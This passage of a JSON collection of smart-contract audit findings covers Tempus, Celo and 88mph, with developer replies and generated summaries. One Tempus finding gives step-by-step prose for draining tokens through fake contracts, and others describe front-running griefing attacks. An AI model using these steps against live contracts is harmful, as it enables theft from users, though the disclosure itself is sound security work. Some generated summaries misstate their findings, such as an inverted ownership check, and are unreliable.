      "content": "_Submitted by cmichel_.\n\nThere's a griefing attack where an attacker can make any user transaction for `TempusController.exitTempusAMM` fail.\nIn `_exitTempusAMM`, the user exits their LP position and claims back yield and principal shares.\nThe LP amounts to redeem are determined by the function parameter `lpTokensAmount`.\nA final `assert(tempusAMM.balanceOf(address(this)) == 0)` statement checks that the LP token amount of the contract is zero after the exit.\nThis is only true if no other LP shares were already in the contract.\n\nHowever, an attacker can frontrun this call and send the smallest unit of LP shares to the contract which then makes the original deposit-and-fix transaction fail.\n\n#### Impact\n\nAll `exitTempusAMM` calls can be made to fail and this function becomes unusable.\n\n#### Recommended Mitigation Steps\n\nRemove the `assert` check.\n\n**[mijovic (Tempus) confirmed](https://github.com/code-423n4/2021-10-tempus-findings/issues/21#issuecomment-947962445):**\n > Great finding. This can block people exiting AMM via `TempusController`.\n\n**[mijovic (Tempus) patched](https://github.com/code-423n4/2021-10-tempus-findings/issues/21#issuecomment-948350606):**\n > Fixed in https://github.com/tempus-finance/tempus-protocol/pull/369\n\n\n\n",
      "summary": "\nThe report states that there is a bug in the Tempus protocol where an attacker can make any user transaction for `TempusController.exitTempusAMM` fail. This function allows users to exit their LP position and claim back yield and principal shares. The bug occurs because the function parameter `lpTokensAmount` is used to determine the amount of LP tokens to redeem, but an attacker can manipulate this parameter to cause the transaction to fail. As a result, the `exitTempusAMM` function becomes unusable. The recommended mitigation step is to remove the `assert` check in the code. The Tempus team has confirmed and patched the bug. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tempus Finance",
      "source_link": "https://code4rena.com/reports/2021-10-tempus",
      "github_link": "https://github.com/code-423n4/2021-10-tempus-findings/issues/21",
      "tags": [],
      "finders": []
    },
    {
      "id": "898",
      "title": "[M-02] depositAndFix can be made to fail",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThere's a griefing attack where an attacker can make any user transaction for `TempusController.depositAndFix` fail.\nIn `_depositAndFix`, `swapAmount` many yield shares are swapped to principal where `swapAmount` is derived from the function arguments.\nA final `assert(yieldShares.balanceOf(address(this)) == 0)` statement checks that the yield shares of the contract are zero after the swap.\nThis is only true if no other yield shares were already in the contract.\n\nHowever, an attacker can frontrun this call and send the smallest unit of yield shares to the contract which then makes the original deposit-and-fix transaction fail.\n\n## Impact\nAll `depositAndFix` calls can be made to fail and this function becomes unusable.\n\n## Recommended Mitigation Steps\nRemove the `assert` check.",
      "summary": "\nThis bug report details a griefing attack on the TempusController.depositAndFix function. In this attack, an attacker can send the smallest unit of yield shares to the contract, which makes the original deposit-and-fix transaction fail. This means that all depositAndFix calls can be made to fail, making the function unusable. The recommended mitigation step for this bug is to remove the assert check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tempus Finance",
      "source_link": "https://code4rena.com/reports/2021-10-tempus",
      "github_link": "https://github.com/code-423n4/2021-10-tempus-findings/issues/20",
      "tags": [],
      "finders": [
        "cmichel."
      ]
    },
    {
      "id": "897",
      "title": "[M-01] exitTempusAMM can be made to fail",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThere's a griefing attack where an attacker can make any user transaction for `TempusController.exitTempusAMM` fail.\nIn `_exitTempusAMM`, the user exits their LP position and claims back yield and principal shares.\nThe LP amounts to redeem are determined by the function parameter `lpTokensAmount`.\nA final `assert(tempusAMM.balanceOf(address(this)) == 0)` statement checks that the LP token amount of the contract is zero after the exit.\nThis is only true if no other LP shares were already in the contract.\n\nHowever, an attacker can frontrun this call and send the smallest unit of LP shares to the contract which then makes the original deposit-and-fix transaction fail.\n\n## Impact\nAll `exitTempusAMM` calls can be made to fail and this function becomes unusable.\n\n## Recommended Mitigation Steps\nRemove the `assert` check.",
      "summary": "\nThis bug report details a vulnerability in the TempusController.exitTempusAMM function, which allows an attacker to make any user transaction fail. This is done by the attacker sending the smallest unit of LP shares to the contract before the user's transaction, which causes the assert check to fail. This makes the function unusable, and the recommended mitigation step is to remove the assert check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tempus Finance",
      "source_link": "https://code4rena.com/reports/2021-10-tempus",
      "github_link": "https://github.com/code-423n4/2021-10-tempus-findings/issues/21",
      "tags": [],
      "finders": [
        "cmichel."
      ]
    },
    {
      "id": "896",
      "title": "[H-01] Steal tokens from TempusController",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon_.\n\n#### Impact\n\nThe function `\\_depositAndProvideLiquidity` can be used go retrieve arbitrary ERC20 tokens from the TempusController.sol contract.\n\nAs the test contract of TempusController.sol <https://goerli.etherscan.io/address/0xd4330638b87f97ec1605d7ec7d67ea1de5dd7aaa> shows, it has indeed ERC20 tokens.\n\nThe problem is due to the fact that you supply an arbitrary tempusAMM to depositAndProvideLiquidity and thus to `\\_depositAndProvideLiquidity`.\ntempusAMM could be a fake contract that supplies values that are completely fake.\n\nAt the end of the function `\\_depositAndProvideLiquidity`, ERC20 tokens are send to the user. If you can manipulate the variables ammTokens,  mintedShares  and sharesUsed you can send back\nany tokens held in the contract\n\"ammTokens\\[0].safeTransfer(msg.sender, mintedShares - sharesUsed\\[0]);\"\n\nThe Proof of Concept shows an approach to do this.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L73-L79>\n\n- <https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L304-L335>\n\n- Create a fake Vault contract (fakeVault) with the following functions:\n`fakeVault.getPoolTokens(poolId)` --> returns {TokenToSteal1,TokenToSteal2},{fakeBalance1,fakeBalance2},0\n`fakeVault.JoinPoolRequest()` --> do nothing\n`fakeVault.joinPool()` --> do nothing\n\n- Create a fake Pool contract (fakePool) with the following functions:\n`fakePool.yieldBearingToken()` --> returns fakeYieldBearingToken\n`fakePool.deposit()` --> returns fakeMintedShares,....\n\n- Create a fake ammTokens contract with the following functions:\n`tempusAMM.getVault()` --> returns fakeVault\n`tempusAMM.getPoolId()` --> returns 0\n`tempusAMM.tempusPool()` --> returns fakePool\n\n- call depositAndProvideLiquidity(fakeTempusAMM,1,false) // false -> yieldBearingToken\n\\_getAMMDetailsAndEnsureInitialized returns fakeVault,0, {token1,token2},{balance1,balance2}\n\\_deposit(fakePool,1,false) calls \\_depositYieldBearing which calls `fakePool.deposit()`  and returns fakeMintedShares\n\\_provideLiquidity(...)  calculates a vale of ammLiquidityProvisionAmounts\n\\_provideLiquidity(...)  skips the safeTransferFrom because sender == address(this))\nthe calls to fakeVault.JoinPoolRequest() and fakeVault.joinPool() can be faked.\n\\_provideLiquidity(...)  returns the value ammLiquidityProvisionAmounts\n\nNow fakeMintedShares - ammLiquidityProvisionAmounts number of TokenToSteal1 and TokenToSteal2 are transferred to msg.sender\n\nAs you can both manipulate TokenToSteal1 and fakeMintedShares, you can transfer any token to msg.sender\n\n#### Recommended Mitigation Steps\n\nCreate a whitelist for tempusAMMs\n\n**[mijovic (Tempus) confirmed](https://github.com/code-423n4/2021-10-tempus-findings/issues/10#issuecomment-946718849):**\n > This is a good point. However, these tokens that are locked in `TempusController` are coming from dust that was left when the user is doing early redemption. As this needs to be done with equal shares, we have a threshold parameter that is used as the maximum leftover behind redemption (usually there is a need to do a swap before redemption to make this work). So, this is going to be pennies always.\n>\n> I would not consider this as high risk, and we are not planning to fix this as steps to make this hack are too complicated to steal pennies... Also, the gas cost of doing it costs by far more than the funds that someone can steal.\n\n**[mijovic (Tempus) commented](https://github.com/code-423n4/2021-10-tempus-findings/issues/10#issuecomment-946905741):**\n > We changed point of view here a little bit. Will add registry of TempusAMMs and TempusPools that can be used with controller, just to prevent possible attacks with fake amms and pools.\n\n**[mijovic (Tempus) patched](https://github.com/code-423n4/2021-10-tempus-findings/issues/10#issuecomment-948351797):**\n > Added whitelist registry for both `TempusAMM` and `TempusPool` in this PR https://github.com/tempus-finance/tempus-protocol/pull/365\n> However, as amount of tokens that TempusController holds is so small (I would say this is of severity 2)\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-10-tempus-findings/issues/10#issuecomment-954181571):**\n > The C4 docs don't speculate on the amount of assets stolen in the TLDR of risk assessment.\n>\n> ```\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> ```\n>\n> Given the fact that some amount of assets could be stolen, i believe this is the correct severity for the issue.\n\n\n\n\n",
      "summary": "\nA bug was detected in the TempusController.sol contract, which allowed users to retrieve arbitrary ERC20 tokens from the contract. This was due to the fact that the function _depositAndProvideLiquidity could be used to supply an arbitrary tempusAMM, which could be a fake contract that supplies fake values. By manipulating the variables ammTokens, mintedShares and sharesUsed, any tokens held in the contract could be sent back to the user. The proof of concept demonstrated an approach to do this.\n\nTo mitigate this issue, it is recommended to create a whitelist for tempusAMMs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tempus Finance",
      "source_link": "https://code4rena.com/reports/2021-10-tempus",
      "github_link": "https://github.com/code-423n4/2021-10-tempus-findings/issues/10",
      "tags": [],
      "finders": [
        "gpersoon."
      ]
    },
    {
      "id": "10871",
      "title": "[L08] Unnecessary operations in revokeVotes",
      "impact": "LOW",
      "content": "The [`revokeVotes`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L672) function is used to set a voters `referendumVotes` for a proposal [to zero](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L688). However, it is executed against all active proposals, including ones where the voter hasn’t voted. In such cases, [all the operations](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L685-L688) associated with removing a voter’s `referendumVotes` will still occur.\n\n\nConsider only executing the main logic of the function [when the voter has submitted non-zero `referendumVotes`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L680) for the relevant proposal, to avoid wasting gas.\n\n\n**Update:** *Fixed in commit [056a5b4](https://github.com/celo-org/celo-monorepo/commit/056a5b43cb6e77a577589049c36006db4a492249).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10870",
      "title": "[L07] Unnecessary Access Control",
      "impact": "LOW",
      "content": "The [`setEip712DomainSeparator` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L122) of the `Accounts` contract can only be called by the contract owner. However, it is simply used to initialize a contract variable, and its functionality does not depend on the caller. For simplicity, consider removing the `onlyOwner` modifier.\n\n\nAdditionally, consider calling this function within [the contract initializer](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L114). This will not affect any contracts that are upgraded to this version, but it would ensure that fresh deployments are initialized correctly.\n\n\n**Update:** *Fixed in commit [2049082](https://github.com/celo-org/celo-monorepo/commit/20490824f00f53facff171703dd7263fada6cad4).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10869",
      "title": "[L06] Proxy ownership fragility",
      "impact": "LOW",
      "content": "After deploying an `InitializableProxy`, the `ProxyCloneFactory` [transfers ownership of the proxy to itself](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/ProxyCloneFactory.sol#L58). This potentially allows the proxy to invoke its own administration functions. Since the proxy’s functionality is determined by its logic contract, whether this is possible or desirable depends on the particular use case and implementation, but that may not be obvious when constructing the logic contract. In particular, implementations that permit arbitrary function calls may accidentally introduce this behavior. Consider documenting this possibility in the [`deploy` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/ProxyCloneFactory.sol#L49) comments so that proxy users are aware of the risk.\n\n\n**Update:** *Fixed in commit [222644b](https://github.com/celo-org/celo-monorepo/commit/222644b692f54632a52e6850c8cf1911dbb4238e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10868",
      "title": "[L05] Missing Event",
      "impact": "LOW",
      "content": "The [`removeLegacySigner` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L532) of the `Accounts` contract does not emit an event. Consider emitting events after all sensitive changes to facilitate tracking and notify off-chain clients about the contract’s activity.\n\n\n**Update:** *Fixed in commit [8317448](https://github.com/celo-org/celo-monorepo/commit/8317448c6c17a713e321ddcd5c06bf6a42ad5362).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10867",
      "title": "[L04] Missing docstrings",
      "impact": "LOW",
      "content": "The [function `getRoleAuthorizationSigner`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L937) is missing natspec comments. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n**Update:** *Fixed in commits [234c647](https://github.com/celo-org/celo-monorepo/commit/234c647332baf6344a738f01027145f1bb115c39) and [9e04953](https://github.com/celo-org/celo-monorepo/commit/9e04953da04bb784d7d002d81129ec9cc8ab427b).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10866",
      "title": "[L03] Misleading comments",
      "impact": "LOW",
      "content": "Within the codebase, some misleading comments or docstrings were identified. For example:\n\n\n* [Line 271 of `Accounts.sol`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L271) indicates that the signature is over `msg.sender`, when in actuality it should be a signature on the EIP 712 encoding of `AuthorizeSigner` struct with the `msg.sender` account and the specified role.\n* [Line 900 of `Accounts.sol`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L900) should better reflect the logic of the function. Consider changing the comment to “Returns `false` if authorized signer for another account. Returns `true` otherwise”.\n\n\nConsider updating the comments and docstrings to more accurately describe the purpose and effect of the codebase.\n\n\n**Update:** *Fixed in commit [3b27e3a](https://github.com/celo-org/celo-monorepo/commit/3b27e3a2c1faa10e8b0cc3e47535a96d7e2a187a).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10865",
      "title": "[L02] Extraneous Events",
      "impact": "LOW",
      "content": "Many functions in the `Accounts` contract complete successfully and emit extraneous events when there is no operation to be performed. For example, it’s possible to [authorize a signer](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L273) that already exists or [remove a signer](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/common/Accounts.sol#L559) that doesn’t exist. In such cases, the emitted event will not correspond to any executed action, which may intefere with offline processing. Consider validating that the contract state has changed before emitting events.\n\n\n**Update:** *The Celo team decided not to address this. In their words:*\n\n\n\n> \n> 1. Extraneous events should be considered no-ops from the perspective of indexing the chain\n> 2. The current behaviour is consistent with the other setters (e.g.`setName`, `setMetadataURL`, etc) in our `Accounts.sol` contract\n> 3. Calls to authorise signers remain idempotent which is desirable and correct\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10864",
      "title": "[L01] Discarded return value",
      "impact": "LOW",
      "content": "The `makeCall` function of the `IdentityProxy` contract allows an authorized user to [make an arbitrary call](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/identity/IdentityProxy.sol#L25) on behalf of the contract. However, the return value of the call is discarded, which unnecessarily limits the possible use cases. Consider bubbling the return value back to the caller so they can react to it.\n\n\n**Update:** *Fixed in commits [d417345](https://github.com/celo-org/celo-monorepo/commit/d4173450bec550eec92c07a1e0dd0acb0720b32e) and [cba251c](https://github.com/celo-org/celo-monorepo/commit/cba251cccd8495bbe6fb3a551714b2d895db6641).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10863",
      "title": "[M01] Potential out of gas error in revokeVotes",
      "impact": "MEDIUM",
      "content": "Within the [`revokeVotes` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L672), the [`for` loop will execute `dequeued.length`](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L676-L679) number of times.\n\n\nSince the size of `dequeued` increases over time, eventually the contract may reach a state where `revokeVotes` will consume more than the available gas limit. This will make `revokeVotes` unusable.\n\n\nConsider modifying `revokeVotes` to bound the number of iterations which the `for` loop can perform. This can be achieved, for example, by allowing users to specify indices within `dequeued` to clear.\n\n\n**Update:** *The Celo team decided not to address this. In their words:*\n\n\n\n> \n>  On the `Governance` contract, there is a maximum of `concurrentProposals` dequeued (added to the `dequeued` array) per `dequeueFrequency` time interval. The lifetime of a proposal is limited to `stageDurations.Approval + stageDurations.Referendum + stageDurations.Execution`, before it will be expired and removed from `dequeued` array. Therefore, the length of `dequeued` is already strongly limited.\n> \n> \n>  We could allow indices to be provided but the intent of this method is to guarantee that `isVoting(msg.sender) == false`. Without checking all of the `dequeued` indices, we cannot assign `voter.mostRecentReferendumProposal = 0`, and the method won’t accomplish its goal if misused. There is virtually no utility in a `revokeVotes` that only revokes some of the dequeued proposals.\n> \n> \n>",
      "summary": "\nThis bug report is about the [`revokeVotes` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L672) in the Governance contract. The issue is that the [`for` loop](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L676-L679) will execute `dequeued.length` number of times, and the size of `dequeued` increases over time. This will eventually lead to the contract reaching a state where `revokeVotes` will consume more than the available gas limit, making it unusable.\n\nA potential solution is to modify `revokeVotes` to bound the number of iterations of the `for` loop, for example by allowing users to specify indices within `dequeued` to clear. However, the Celo team decided not to address this, since the intent of the method is to guarantee that `isVoting(msg.sender) == false`, and without checking all of the `dequeued` indices, it won't be able to do that. Additionally, there is virtually no utility in a `revokeVotes` that only revokes some of the dequeued proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10862",
      "title": "[H01] Incorrect use of require in revokeVotes",
      "impact": "HIGH",
      "content": "The [`revokeVotes` function](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L672) of the `Governance` contract is intended to revoke votes on proposals in the Referendum stage. However, it actually [`requires` all `dequeued` proposals to be in that stage](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L683), which is not necessary during normal operations. Whenever any element of `dequeued` is not within the `Referendum` stage, the `revokeVotes` function will revert. This effectively makes the `revokeVotes` function unusable.\n\n\nInstead of reverting, consider performing [the following operations](https://github.com/celo-org/celo-monorepo/blob/f64b4c5b5228ecbf41e3e7cfdbb8c0e9a983eea2/packages/protocol/contracts/governance/Governance.sol#L684-L688) if the proposal is within the `Referendum` stage. Otherwise, that iteration of the loop should be treated as a no-op.\n\n\n**Update:** *Fixed in commits [a10bdf3](https://github.com/celo-org/celo-monorepo/commit/a10bdf3e42ecb0667cbe98d287bac02c1da85e93) and [750341b](https://github.com/celo-org/celo-monorepo/commit/750341b6c62a0d8f2641fcbe841d03ed3c7d7ff2).*",
      "summary": "\nThe `revokeVotes` function of the `Governance` contract is intended to revoke votes on proposals in the Referendum stage. However, it currently requires all dequeued proposals to be in the Referendum stage, which is not necessary during normal operations. If any element of dequeued is not within the Referendum stage, the `revokeVotes` function will revert. This makes the function unusable.\n\nTo fix this issue, the following operations should be performed if the proposal is within the Referendum stage. Otherwise, the iteration of the loop should be treated as a no-op. This issue has now been fixed in commits a10bdf3 and 750341b.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Release 4",
      "source_link": "https://blog.openzeppelin.com/celo-audit-release-4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42190",
      "title": "[G-01] Gas optimizations by using external over public",
      "impact": "GAS",
      "content": "\nSome functions could use external instead of public in order to save gas.\n\nIf we run the following methods on Remix, we can see the difference:\n```solidity\n  //  transaction cost  21448 gas\n  //  execution cost    176 gas\n  function tt() external returns(uint256) {\n      return 0;\n  }\n\n  //  transaction cost  21558 gas\n  //  execution cost    286 gas\n  function tt_public() public returns(uint256) {\n      return 0;\n  }\n```\n\n**[ZeframLou (88mph) disputed](https://github.com/code-423n4/2021-05-88mph-findings/issues/18#issuecomment-844566246):**\n> Many of the functions listed are also called within the contract, so changing their visibility to `public` will break things.\n\n**[ghoul.sol commented](https://github.com/code-423n4/2021-05-88mph-findings/issues/18#issuecomment-851067622):**\n> Even though out of the whole list, only a few functions are good candidates to be changed, it's technically a valid suggestion.\n\n**[ZeframLou (88mph) confirmed](https://github.com/code-423n4/2021-05-88mph-findings/issues/18#issuecomment-856489515):**\n> Addressed in [this commit](https://github.com/88mphapp/88mph-contracts/commit/e1df42dc46960ecd0c67a8d896f933149ea129e4).\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/18",
      "tags": [],
      "finders": []
    },
    {
      "id": "42189",
      "title": "[M-02] Unchecking the ownership of `mph` in function `distributeFundingRewards` could cause several critical functions to revert",
      "impact": "MEDIUM",
      "content": "\nIn contract `MPHMinter`, the function `distributeFundingRewards` does not check whether the contract itself is the owner of `mph`. If the contract is not the owner of `mph`, `mph.ownerMint` could revert, causing functions such as `withdraw`, `rolloverDeposit`, `payInterestToFunders` in the contract `DInterest` to revert as well.\n\nRecommend adding a `mph.owner() != address(this)` check as in the other functions (e.g., `mintVested`).\n\n**[ZeframLou (88mph) confirmed](https://github.com/code-423n4/2021-05-88mph-findings/issues/23#issuecomment-844625823):**\n> Fixed in [this commit](https://github.com/88mphapp/88mph-contracts/commit/026dde3d30bddedbc1eeca6c87bce4bc5b5c7ee5).\n \n",
      "summary": "\nThe bug report is about a function called `distributeFundingRewards` in the `MPHMinter` contract. This function does not check if the contract itself is the owner of `mph`, which can cause problems when trying to use other functions in the `DInterest` contract. The recommendation is to add a check to make sure the contract is not the owner of `mph`, similar to other functions. The issue has been confirmed and fixed by the developer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/23",
      "tags": [],
      "finders": []
    },
    {
      "id": "4043",
      "title": "[G-02] Gas optimizations - storage over memory",
      "impact": "GAS",
      "content": "\nSome functions are using memory to read state variables when using storage is more gas efficient.\n\n[Solidity doc reference](https://docs.soliditylang.org/en/v0.4.21/types.html#reference-types)\n\n**[ZeframLou (88mph) disputed](https://github.com/code-423n4/2021-05-88mph-findings/issues/19#issuecomment-844565136):**\n> The memory location of those variables is intentionally set to be `memory` to only load the data from storage once to save gas. If changed to `storage`, there will be multiple `SLOAD's for accessing the same variable, which is expensive.\n\n**[ghoul.sol commented](https://github.com/code-423n4/2021-05-88mph-findings/issues/19#issuecomment-851069151):**\n> In case of the `withdrawableAmountOfDeposit` function, the warden is right. `_getDeposit` makes 7 `SLOAD` calls in this case because it's pulling the whole object from storage. Using storage would make only 5 `SLOAD` calls.\n> \n> In the case of `_getVestWithdrawableAmount`, either way uses 6 `SLOAD` calls.\n> \n> Warden is correct in at least one case, so the reports stand.\n\n**[ZeframLou (88mph) confirmed](https://github.com/code-423n4/2021-05-88mph-findings/issues/19#issuecomment-856489220):**\n> Addressed in [this commit](https://github.com/88mphapp/88mph-contracts/commit/6459177a642d854ca6ee4deeda7f61075bd4bdf1).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "88mph",
      "source_link": "https://code4rena.com/reports/2021-05-88mph",
      "github_link": "https://github.com/code-423n4/2021-05-88mph-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "4042",
      "title": "[G-01] Gas optimizations by using external over public ",
      "impact": "GAS",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\n## Impact\n\nSome functions could use external instead of public in order to save gas.\n\nIf we run the following methods on Remix, we can see the difference\n```\n  //  transaction cost  21448 gas\n  //  execution cost    176 gas\n  function tt() external returns(uint256) {\n      return 0;\n  }\n\n  //  transaction cost  21558 gas\n  //  execution cost    286 gas\n  function tt_public() public returns(uint256) {\n      return 0;\n  }\n```\n\n```\nsurplusOfDeposit(uint256) should be declared external:\n        - DInterest.surplusOfDeposit(uint256) (contracts/DInterest.sol#623-648)\ndividendOf(uint256,address,address) should be declared external:\n        - ERC1155DividendToken.dividendOf(uint256,address,address) (contracts/libs/ERC1155DividendToken.sol#101-107)\nwithdrawnDividendOf(uint256,address,address) should be declared external:\n        - ERC1155DividendToken.withdrawnDividendOf(uint256,address,address) (contracts/libs/ERC1155DividendToken.sol#114-126)\nuri(uint256) should be declared external:\n        - ERC1155Upgradeable.uri(uint256) (contracts/libs/ERC1155Upgradeable.sol#92-94)\nbalanceOfBatch(address[],uint256[]) should be declared external:\n        - ERC1155Upgradeable.balanceOfBatch(address[],uint256[]) (contracts/libs/ERC1155Upgradeable.sol#124-143)\nsetApprovalForAll(address,bool) should be declared external:\n        - ERC1155Upgradeable.setApprovalForAll(address,bool) (contracts/libs/ERC1155Upgradeable.sol#148-160)\nsafeTransferFrom(address,address,uint256,uint256,bytes) should be declared external:\n        - 